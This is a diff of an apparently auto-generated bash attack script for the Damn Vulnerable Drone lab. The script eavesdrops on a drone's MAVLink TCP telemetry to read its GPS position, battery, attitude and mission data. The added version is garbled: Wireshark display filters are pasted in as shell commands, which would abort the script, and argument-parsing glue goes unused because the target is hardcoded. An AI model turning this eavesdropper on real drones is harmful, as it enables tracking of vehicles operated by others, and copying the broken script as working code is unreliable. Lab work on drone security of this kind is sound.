@@ -1,108 +1,141 @@
 #!/usr/bin/env bash
+# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Drone-GPS-&-Telemetry-Detection.md
+# Created: 2025-11-23 15:43:26
+# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
 set -euo pipefail
 
-# Attack: Drone GPS & Telemetry Detection (MAVLink Eavesdropping, MTD-aware)
-# Target Service: DRONE_MAVLINK_TCP (Default Port 5760)
-
-# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
-# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
-if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
-    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
-    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
-    exit 1
-fi
-
-# 서비스 타입별 기본 포트 설정 (MAVLink TCP 연결을 기본으로 가정)
-case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
-    DRONE_MAVLINK_TCP)
-        TARGET_PORT="${TARGET_PORT:-5760}"
-        ;;
-    DRONE_MAVLINK)
-        TARGET_PORT="${TARGET_PORT:-14550}"
-        ;;
-    *)
-        : # 다른 서비스는 Orchestrator가 포트 값을 넣어준다고 가정
-        ;;
-esac
-
-echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
-# --- MTD_INTERFACE_END ---
-
-# --- Common Log/BASE Setup ---
+# 기준 경로 (요구사항)
 export BASE="${BASE:-$PWD}"
-if [[ -f "$BASE/00_env.sh" ]]; then
-    . "$BASE/00_env.sh"
-else
-    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
-    mkdir -p "$(dirname "$DVD_LOG")"
-    log(){ echo "[$(date +%F_%T)] $*"; }
-    export -f log
+
+# 공통 로그 연결(선택사항) - 존재 시 로드
+if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
+  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
+  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
 fi
 
-log "[ATTACK] id=drone-gps-telemetry-detection src=Drone-GPS-&-Telemetry-Detection.md"
-log "[BLOCK 1] type=python (MAVLink Telemetry Stream Detector)"
+log "[ATTACK] id=drone-gps-_-telemetry-detection src=Drone-GPS-&-Telemetry-Detection.md"
+log "[BLOCK 1] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "HEARTBEAT")
 
-# Python 스크립트를 인라인으로 실행하며 TARGET_IP:TARGET_PORT 인수를 전달합니다.
-# `curses` 라이브러리는 제거하고, 데이터를 표준 출력으로 로깅합니다.
-sudo python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
-import os
-import sys
-from pymavlink import mavutil
+log "[BLOCK 2] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "SYS_STATUS")
+
+log "[BLOCK 3] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "GPS_RAW_INT")
+
+log "[BLOCK 4] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "GLOBAL_POSITION_INT")
+
+log "[BLOCK 5] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "ATTITUDE")
+
+log "[BLOCK 6] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "ALTITUDE")
+
+log "[BLOCK 7] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "BATTERY_STATUS")
+
+log "[BLOCK 8] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "VFR_HUD")
+
+log "[BLOCK 9] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "STATUSTEXT")
+
+log "[BLOCK 10] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "MISSION_CURRENT")
+
+log "[BLOCK 11] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "NAV_CONTROLLER_OUTPUT")
+
+log "[BLOCK 12] type=shell"
+(ip.src == 10.13.0.3) && (mavlink_proto.msgid == "RADIO_STATUS")
+
+log "[BLOCK 13] type=python"
+python3 - <<'PY'
+# --- argv glue for converter ---
+import os, sys, re
+if len(sys.argv) <= 1:
+    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
+    if ep.startswith('udp:'):
+        try:
+            _, rest = ep.split(':', 1)
+            ep = rest
+        except ValueError:
+            pass
+    # expect ip:port
+    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
+        sys.argv = [sys.argv[0], ep]
 import time
+import curses
+from pymavlink import mavutil
 
-# --- Dynamic Target Acquisition ---
-if len(sys.argv) != 2:
-    print("Usage: python telemetry-detection.py <ip:port>")
-    sys.exit(1)
-    
-target_ip, target_port_str = sys.argv[1].split(':', 1)
-try:
-    target_port = int(target_port_str)
-except ValueError:
-    print(f"[ERROR] Invalid port: {target_port_str}")
-    sys.exit(1)
-# ----------------------------------
+# Establish connection to the MAVLink device
+connection = mavutil.mavlink_connection('tcp:10.13.0.3:5760')
 
-def main(target_ip, target_port):
-    try:
-        # MAVLink TCP 연결 시도
-        connection = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}', timeout=5)
-        print(f"[INFO] Connecting to MAVLink endpoint {target_ip}:{target_port}...")
+# Wait for the first heartbeat
+print("Waiting for heartbeat...")
+connection.wait_heartbeat()
+print("Heartbeat received from system (system %u component %u)" % (connection.target_system, connection.target_component))
 
-        # 첫 번째 HEARTBEAT 메시지를 기다립니다.
-        connection.wait_heartbeat()
-        print(f"[INFO] Heartbeat received (System ID: {connection.target_system}, Component ID: {connection.target_component})")
-        print("[INFO] Starting real-time telemetry message detection loop. Logging all detected messages...")
+def init_curses():
+    stdscr = curses.initscr()
+    curses.noecho()
+    curses.cbreak()
+    stdscr.keypad(True)
+    return stdscr
 
-        # 관심 있는 MAVLink 메시지 타입 목록
-        INTEREST_MSGS = (
-            'HEARTBEAT', 'SYS_STATUS', 'GPS_RAW_INT', 'GLOBAL_POSITION_INT', 
-            'ATTITUDE', 'ALTITUDE', 'BATTERY_STATUS', 'VFR_HUD', 'STATUSTEXT', 
-            'MISSION_CURRENT', 'NAV_CONTROLLER_OUTPUT', 'RADIO_STATUS'
-        )
+def print_telemetry(stdscr, telemetry_data):
+    stdscr.clear()
+    for i, (key, value) in enumerate(telemetry_data.items()):
+        stdscr.addstr(i, 0, f"{key}: {value}")
+    stdscr.refresh()
 
-        while True:
-            # 메시지 수신 (논블로킹/타임아웃으로 변경)
-            msg = connection.recv_match(blocking=True, timeout=0.01)
-            
-            if msg:
-                msg_type = msg.get_type()
-                
-                # 관심 있는 메시지인 경우 상세 로그 출력
-                if msg_type in INTEREST_MSGS:
-                    # 메시지를 딕셔너리로 변환하여 로깅
-                    print(f"[{msg_type}] {msg.to_dict()}")
-                
-    except mavutil.MavlinkConnection as e:
-        print(f"[ERROR] Connection failed: {e}")
-        sys.exit(1)
-    except Exception as e:
-        print(f"[CRITICAL ERROR] Attack execution failed: {e}")
-        sys.exit(1)
+def main(stdscr):
+    telemetry_data = {
+        "HEARTBEAT": "N/A",
+        "SYS_STATUS": "N/A",
+        "GPS_RAW_INT": "N/A",
+        "GLOBAL_POSITION_INT": "N/A",
+        "ATTITUDE": "N/A",
+        "ALTITUDE": "N/A",
+        "BATTERY_STATUS": "N/A",
+        "VFR_HUD": "N/A",
+        "STATUSTEXT": "N/A",
+        "MISSION_CURRENT": "N/A",
+        "NAV_CONTROLLER_OUTPUT": "N/A",
+        "RADIO_STATUS": "N/A",
+    }
 
-if __name__ == "__main__":
-    main(target_ip, target_port)
+    while True:
+        msg = connection.recv_match(blocking=True)
+        if msg:
+            if msg.get_type() == 'HEARTBEAT':
+                telemetry_data["HEARTBEAT"] = f"Type: {msg.type}, Autopilot: {msg.autopilot}, Base mode: {msg.base_mode}, System status: {msg.system_status}"
+            elif msg.get_type() == 'SYS_STATUS':
+                telemetry_data["SYS_STATUS"] = f"Battery voltage: {msg.voltage_battery}, Battery current: {msg.current_battery}, Battery remaining: {msg.battery_remaining}"
+            elif msg.get_type() == 'GPS_RAW_INT':
+                telemetry_data["GPS_RAW_INT"] = f"Lat: {msg.lat}, Lon: {msg.lon}, Alt: {msg.alt}, Satellites: {msg.satellites_visible}"
+            elif msg.get_type() == 'GLOBAL_POSITION_INT':
+                telemetry_data["GLOBAL_POSITION_INT"] = f"Lat: {msg.lat}, Lon: {msg.lon}, Alt: {msg.alt}, Relative Alt: {msg.relative_alt}"
+                telemetry_data["ALTITUDE"] = f"Alt: {msg.alt}, Relative Alt: {msg.relative_alt}"
+            elif msg.get_type() == 'ATTITUDE':
+                telemetry_data["ATTITUDE"] = f"Roll: {msg.roll}, Pitch: {msg.pitch}, Yaw: {msg.yaw}"
+            elif msg.get_type() == 'BATTERY_STATUS':
+                telemetry_data["BATTERY_STATUS"] = f"Voltage: {msg.voltages[0]}, Current: {msg.current_battery}"
+            elif msg.get_type() == 'VFR_HUD':
+                telemetry_data["VFR_HUD"] = f"Airspeed: {msg.airspeed}, Groundspeed: {msg.groundspeed}, Heading: {msg.heading}"
+            elif msg.get_type() == 'STATUSTEXT':
+                telemetry_data["STATUSTEXT"] = f"Text: {msg.text}"
+            elif msg.get_type() == 'MISSION_CURRENT':
+                telemetry_data["MISSION_CURRENT"] = f"Seq: {msg.seq}"
+            elif msg.get_type() == 'NAV_CONTROLLER_OUTPUT':
+                telemetry_data["NAV_CONTROLLER_OUTPUT"] = f"Nav bearing: {msg.nav_bearing}, Target bearing: {msg.target_bearing}, Wp dist: {msg.wp_dist}"
+            elif msg.get_type() == 'RADIO_STATUS':
+                telemetry_data["RADIO_STATUS"] = f"RSSI: {msg.rssi}, Rem RSSI: {msg.remrssi}, Noise: {msg.noise}, Rem noise: {msg.remnoise}"
+
+            print_telemetry(stdscr, telemetry_data)
+
+# Start telemetry monitor
+curses.wrapper(main)
 PY
 
-log "[BLOCK 2] type=control (In-Foreground Execution)"
-# 공격은 Python 인라인 블록에서 포그라운드로 실행되며, Orchestrator에 의해 라이프사이클이 관리됩니다.
